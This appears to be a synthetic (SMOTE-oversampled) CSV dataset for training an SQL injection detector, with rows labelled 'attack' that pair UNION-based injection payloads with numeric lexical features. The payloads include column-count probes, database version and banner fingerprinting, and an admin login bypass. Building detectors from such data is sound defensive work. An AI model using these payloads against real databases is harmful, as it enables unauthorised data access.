id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000381,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,0.8427309289165712,87.0221936867003,26.58668378797982,3.9730356126803312,25.9778063132997,34.92441305537033,15.60887747468012,10.51109684335015,0.30018824495962504,0.4004296876677416,0.17908305926349735,0.12029900810913606,0.0,1.2933418939899095,2.7066581060100905,0.0,0.0,1.0,0.0,0.9022193686700302,0.0,0.0,4.608877474680121,3.7066581060100905,0.0,1.0,0.9022193686700302,0.0,0.0,1.0,0.90221936867003,0.0,0.0,0.0,0.0,1.0,1.0,0.9022193686700303,-5.551115123125783e-17,0.09778063132996984,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000382,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,3.269985736509197,84.27634035930981,31.53618298203451,4.370588367116577,40.75328087424156,14.059242467102768,17.0,12.463817017965491,0.49520520558013825,0.1510021760440825,0.20453364405498006,0.14925897432079915,1.3914510538964733,0.0,2.463817017965491,0.0,1.072365964069018,1.0,0.0,0.463817017965491,0.0,0.0,1.927634035930982,6.536182982034509,0.463817017965491,0.0,1.0,0.0,0.0,1.0,0.463817017965491,0.0,0.0,0.0,0.46381701796549113,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000383,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,1.2678300141731818,74.44633339513868,28.553666604861327,4.303081448806314,29.0,20.0,15.0,10.446333395138673,0.3895596993767529,0.2686618616391399,0.20149639622935495,0.14028204275475228,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,5.446333395138673,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.4463333951386733,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000384,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.8194192582813737,100.6002744106342,29.87994511787316,4.265242618887122,37.0,32.48021952850736,17.0,14.12005488212684,0.36964496141689324,0.32046059059430065,0.1698368741645185,0.14005757382428757,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.1200548821268415,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000385,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,0.1406957577136176,75.72155231457528,28.0,4.268908768913897,29.0,20.607623001747594,15.0,11.113929312827674,0.3836985791315343,0.2710837842325623,0.19846478230941433,0.14675285432648902,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1519057504368995,5.962023562390775,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9620235623907755,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000386,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000026,1.1538686600861983,108.46945696184312,29.378043520175535,4.274415437788402,34.51217408070214,41.51217408070214,16.378043520175535,16.0670652802633,0.31762535723335344,0.3827237662312349,0.1514795778417071,0.1481712986937046,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.3780435201755346,5.689021760087767,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6890217600877674,2.0,1.0,1.0,0.6890217600877673,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.689021760087767
SMOTE_000387,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,1.0610187296192681,53.98740637663731,20.29874063766373,3.9313446163780257,14.0,26.38992510130985,4.0,9.597481275327462,0.2610659950906711,0.48672080589119476,0.07459028431162029,0.17762291470651392,0.701259362336269,0.29874063766373093,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.597481275327462,3.0,0.7012593623362688,0.29874063766373116,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000388,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,1.150800111666635,99.1237627429153,28.0,4.180576344559326,34.514002912666356,33.785007281665884,16.37850072816659,14.446251820416471,0.35199528471581004,0.333503065608077,0.1686704379962139,0.14583121167989904,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.446251820416472,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.6892503640832943,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.6892503640832945
SMOTE_000389,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.2558333821402061,87.84759661891947,30.31881872561138,4.336095630308953,34.27527490244551,25.27527490244551,16.31881872561138,11.978228088417065,0.3902973031055908,0.2864037568140225,0.1870382128608037,0.136260727219583,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.3188187256113775,5.659409362805689,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6594093628056887,2.0,1.0,1.0,0.6594093628056886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.659409362805689
SMOTE_000390,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,3.2670492349617053,75.0,29.83700961366369,4.329442367244568,35.888786051238824,11.73345673851341,15.918504806831843,11.459252403415922,0.478517147349851,0.15644608984684547,0.2122467307577579,0.15279003204554562,1.6222427897522351,0.0,2.5407475965840782,0.0,0.9185048068318433,1.0,0.0,0.5407475965840783,0.0,0.0,1.0,6.459252403415922,0.5407475965840782,0.0,1.0,0.0,0.0,1.0,0.5407475965840782,0.0,0.0,0.0,0.5407475965840784,2.0,1.0,1.0,0.45925240341592155,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.459252403415922
SMOTE_000391,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,2.1813531437280154,75.0,30.77345996107376,4.358595031600856,39.40047485402659,7.519430175168093,16.386729980536877,11.693364990268439,0.5253396647203545,0.10025906900224124,0.21848973307382505,0.1559115332035792,0.9199050291946822,0.0,2.3066350097315604,0.0,1.3867299805368787,1.0,0.0,0.3066350097315607,0.0,0.0,1.0,6.693364990268439,0.30663500973156066,0.0,1.0,0.0,0.0,1.0,0.30663500973156066,0.0,0.0,0.0,0.30663500973156066,2.0,1.0,1.0,0.6933649902684392,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.69336499026844
SMOTE_000392,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,1.1981605083157174,108.71548647389247,27.571128381526883,4.064401488658039,60.14488342469354,9.141206098397856,27.28661485541935,12.14278209538172,0.5498616335525713,0.08841924685432029,0.24950831116250985,0.11221080843059852,3.0,0.0,2.1427820953817207,0.0,0.8572179046182793,2.7144358092365586,0.0,0.1427820953817207,0.0,0.0,1.2855641907634414,6.0,1.0,0.0,1.0,0.0,0.0,1.0,0.1427820953817207,0.0,0.0,0.0,0.1427820953817207,2.0,1.0,1.8572179046182793,1.8572179046182793,0.0,0.8572179046182793,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.571653713854838
SMOTE_000393,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,1.078704596779024,111.3038787987421,26.0,3.7808299824090588,25.389065389606095,50.44373844157562,19.860140357166486,15.610934610393906,0.2298139084996511,0.45337212167088836,0.17637960212878798,0.1404343677006726,0.19453269480304702,0.805467305196953,3.0,0.0,0.0,0.8054673051969531,0.0,1.805467305196953,0.0,0.0,9.0,3.805467305196953,0.1945326948030469,0.8054673051969532,1.0,0.0,0.0,0.8054673051969531,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.8054673051969531,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.805467305196953
SMOTE_000394,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,1.0137240137657522,97.69565704806143,26.0,3.838654531868027,25.0,40.56266214026421,19.421996605198153,12.710998302599076,0.2578580707574095,0.41476954703604313,0.19761960914377213,0.12975277306277522,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.5703327675330256,0.0,0.0,6.140665535066052,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000395,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.5003577216770637,107.68027461730235,28.0,4.145755004598205,35.84013730865117,39.42006865432559,16.710034327162795,15.710034327162795,0.3323254297013,0.3664406738185417,0.15527457519282084,0.1459593212873375,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.855017163581397,5.855017163581397,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.8550171635813968,2.0,1.0,1.0,0.8550171635813966,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.855017163581397
SMOTE_000396,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,2.2706378509906746,98.64730770730682,27.15503496230785,4.014858869183863,27.310069924615703,39.37986015076859,17.957377631922522,14.0,0.278761362654709,0.3982172012876598,0.1806771916708323,0.14234424438679882,1.7325524434617767,0.4224825188460745,3.0,0.0,0.0,1.0,0.0,1.4224825188460746,0.0,0.0,5.844965037692149,4.577517481153926,0.5775174811539253,0.4224825188460747,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.5775174811539254,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5775174811539254
SMOTE_000397,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.19555061989635678,69.64100264644202,25.0,4.23033479418046,27.0,22.91280211715362,11.0,8.728200529288404,0.3881120206030869,0.32851576756365736,0.15811971209755393,0.12525249973570177,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.728200529288405,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000398,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.9945179928744278,108.2560628249679,28.0,4.1063009839680875,34.67475043329052,41.162624783354744,16.418687608322628,16.0,0.31964582370088684,0.3809131305218799,0.15154742735061497,0.14789361842661833,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.290656195838685,5.709343804161315,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.709343804161315,2.0,1.0,1.0,0.7093438041613149,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.709343804161315
SMOTE_000399,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,3.0675103955893857,64.42870849770466,23.68574169954093,4.181993896816087,30.614210326262437,16.11445019724559,10.014306274655699,7.685741699540932,0.5001474188695408,0.2269640872851491,0.15556474786683328,0.11732374597847672,0.6714354248852329,0.0,2.0143062746556986,0.0,0.32856457511476717,0.0,0.0,1.0,0.0,0.3285645751147672,3.0143062746556986,2.342870849770466,0.6714354248852329,0.0,0.6714354248852329,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.328564575114767,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3285645751147671,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6571291502295344
SMOTE_000400,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.7736738423976165,70.07228672018633,24.88403584002329,4.214316300613737,27.057982079988356,22.84035840023291,11.0,9.173946239965064,0.3877503165772451,0.3226454712246004,0.15754285430933426,0.13206135788882012,1.0579820799883544,0.0,2.8260537600349362,0.11596415997670895,0.0,0.0,0.057982079988354474,1.0579820799883544,0.0,0.05798207998835449,4.0,2.9420179200116454,1.0,0.0,0.9420179200116454,0.0,0.0,0.0,1.0,0.057982079988354474,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.057982079988354474,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0579820799883546
SMOTE_000401,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.3985664379098204,91.47876672605301,28.0,4.209629776547463,32.76657525166926,29.41643812917315,15.941643812917315,13.354109532293288,0.36298289803874634,0.3123221242626577,0.17859900425187922,0.14609597344671676,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.3541095322932875,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.4708219064586575,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.470821906458657
SMOTE_000402,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,1.1731199332340694,43.54827172224445,20.548368387390994,3.957297610787811,17.354798172680482,12.128982366375979,8.774184193695497,5.2903069894924935,0.40364015483003896,0.2618058105546096,0.21455513206615212,0.11999890254919925,0.2580613978984987,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0322455915939948,3.0,0.2580613978984987,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000403,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,0.9858248489300993,109.41574546599378,27.176028281556246,4.046241299264891,63.64794343688751,5.647943436887505,27.94383031066252,12.176028281556246,0.5820803755229562,0.051442081672721296,0.25496454212769126,0.11151300067663117,3.0,0.35205656311249306,2.0,0.0,1.0,2.8239717184437536,0.0,0.0,0.0,0.0,1.0,6.0,1.0,0.1760282815562466,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.8239717184437534,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.823971718443753
SMOTE_000404,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,1.0544975824109655,75.75453123287518,30.811222417404508,4.46939760998118,33.94330881547067,23.811222417404508,11.867913601933834,6.132086398066165,0.4479128823993445,0.3128230491247735,0.15734402819595145,0.0819200402799306,3.603740805801503,0.0,0.396259194198497,0.0,0.0,0.8679136019338344,0.0,0.13208639806616562,0.0,0.0,1.1320863980661655,1.264172796132331,1.0,0.0,0.1320863980661655,0.0,0.0,0.8679136019338345,0.13208639806616568,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.8679136019338343,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8679136019338345
SMOTE_000405,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,1.7931856846502219,74.73015244766775,31.19045734300325,4.378200546372377,39.95228671501624,6.857255941980508,16.460304895335497,11.460304895335499,0.5341071704376283,0.09240250283841489,0.22020004964681272,0.15329027707714404,0.8095426569967514,0.0,2.2698475523322506,0.0,1.4603048953354993,1.0,0.0,0.26984755233225044,0.0,0.0,1.0,6.460304895335499,0.26984755233225044,0.0,1.0,0.0,0.0,1.0,0.26984755233225044,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.7301524476677494,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.7301524476677494
SMOTE_000406,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,3.0807541685389426,98.64678412542392,27.457526513873187,4.002486075005098,53.93441669478986,4.627420458380435,27.169893944507244,12.915053027746376,0.5415407624511522,0.04566312378031798,0.2778959125056854,0.13490020126284435,3.0,0.9150530277463764,2.0,0.0,1.0,2.0849469722536234,0.0,0.9150530277463763,0.0,0.0,1.0,5.542473486126812,1.0,0.4575265138731883,1.0,0.0,0.0,1.0,0.45752651387318827,0.0,0.0,0.0,0.0,2.0,1.0,1.542473486126812,1.5424734861268117,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.084946972253624
SMOTE_000407,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,1.1344322131841995,82.46938554662565,28.576530722668718,4.267048264706655,29.0,26.77550843730052,15.0,11.693877109325129,0.356582492689456,0.31799883746804564,0.1844392203566152,0.14097944948588315,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.69387710932513,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000408,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,0.27782333674964466,107.19943303879504,26.0,3.7668246776062277,25.0,45.75954643103603,22.0,14.439886607759005,0.23354154650352993,0.42633352559435206,0.20551656092310638,0.1346083669790116,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,7.439886607759005,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000409,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,0.3279833711969941,110.4729194101149,27.05856450998723,4.027692536474798,63.88287098002553,5.882870980025533,28.648612940076603,12.058564509987233,0.5784076873816888,0.05318505231603471,0.25916634635710745,0.10924091394516906,3.0,0.1171290199744659,2.0,0.0,1.0,2.9414354900127666,0.0,0.0,0.0,0.0,1.0,6.0,1.0,0.05856450998723295,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.941435490012767,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.941435490012767
SMOTE_000410,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,0.3554704317131764,37.84009365786545,20.073603746314618,4.091022250740225,14.0,13.472074926292363,4.0,6.368018731573091,0.37715787285513824,0.347410552573834,0.10775939224432521,0.16767218232670242,0.9263962536853817,0.07360374631461802,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.3680187315730916,3.0,0.9263962536853817,0.07360374631461836,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,0.6016786958472331,100.14369426277084,26.612065515120534,4.105700072778226,63.75575977789136,3.79597816162649,23.28592356569271,9.306032757560267,0.6352568848906066,0.03759365353999283,0.23236264918574095,0.09478681238365956,0.0,0.0,2.0,0.0,1.102010919186756,1.897989080813244,0.0,0.0,0.0,0.0,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.8979890808132441,2.0,1.0,1.897989080813244,1.897989080813244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.795978161626488
